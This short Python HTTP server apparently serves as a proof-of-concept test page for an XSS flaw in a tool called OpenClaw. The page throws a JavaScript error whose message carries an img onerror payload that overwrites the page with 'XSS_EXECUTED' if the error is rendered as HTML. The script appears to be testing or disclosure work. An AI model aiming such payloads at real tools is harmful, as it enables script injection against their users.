from http.server import HTTPServer, BaseHTTPRequestHandler
import os

HTML = """
<!doctype html>
<html>
<body>

<h1>OpenClaw pageerror XSS test</h1>

<script>
setTimeout(() => {
    throw new Error('<img src=x onerror="document.body.innerHTML=\\'XSS_EXECUTED\\'">');
}, 100);
</script>

</body>
</html>
"""


class Handler(BaseHTTPRequestHandler):

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(HTML.encode())


    def do_HEAD(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()


port = int(os.environ.get("PORT", 8080))

server = HTTPServer(("0.0.0.0", port), Handler)

print(f"Server running on port {port}")

server.serve_forever()
